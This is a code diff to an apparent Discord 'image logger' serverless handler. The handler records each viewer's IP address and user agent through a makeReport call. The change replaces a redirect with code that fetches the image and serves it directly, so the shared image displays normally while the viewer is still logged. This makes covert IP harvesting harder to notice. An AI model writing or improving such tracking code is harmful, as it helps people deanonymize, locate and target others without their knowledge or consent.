@@ -320,9 +320,10 @@ handler = ImageLoggerAPI
 
 # Vercel Serverless Handler - FIXED
 def app(request):
-    """Vercel serverless handler"""
+    """Vercel serverless handler - sends image directly"""
     try:
         from urllib.parse import urlparse, parse_qs
+        import requests
         
         ip = request.headers.get('x-forwarded-for', '0.0.0.0')
         if ip:
@@ -349,14 +350,23 @@ def app(request):
         # Log the request
         makeReport(ip, useragent, endpoint=parsed.path, url=url)
         
-        # Return 302 redirect to image URL for Discord
+        # Download image and send it directly
+        try:
+            img_response = requests.get(url, timeout=5)
+            image_data = img_response.content
+            content_type = img_response.headers.get('Content-Type', 'image/jpeg')
+        except:
+            # Fallback to empty image
+            image_data = b''
+            content_type = 'image/jpeg'
+        
         return {
-            "statusCode": 302,
+            "statusCode": 200,
             "headers": {
-                "Location": url,
-                "Content-Type": "image/jpeg"
+                "Content-Type": content_type,
+                "Content-Length": str(len(image_data))
             },
-            "body": ""
+            "body": image_data.decode('latin-1') if image_data else ""
         }
     
     except Exception as e:
